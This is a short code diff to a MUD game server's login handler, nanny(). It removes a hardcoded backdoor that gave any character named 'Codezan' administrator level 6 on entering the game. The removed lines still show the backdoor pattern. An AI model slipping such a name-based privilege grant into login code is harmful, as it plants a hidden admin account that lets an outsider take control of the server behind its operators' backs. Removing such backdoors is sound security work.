@@ -6647,9 +6647,6 @@ void nanny(struct descriptor_data *d, char *arg)
       load_result = enter_player_game(d);
       send_to_char(d->character, "%s", CONFIG_WELC_MESSG);
       act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
-      if (!strcasecmp(GET_NAME(d->character), "Codezan") || !strcasecmp(GET_NAME(d->character), "codezan")) {
-       GET_ADMLEVEL(d->character) = 6;
-      }
 	 }
 
      /*~~~ For PCOUNT and HIGHPCOUNT ~~~*/
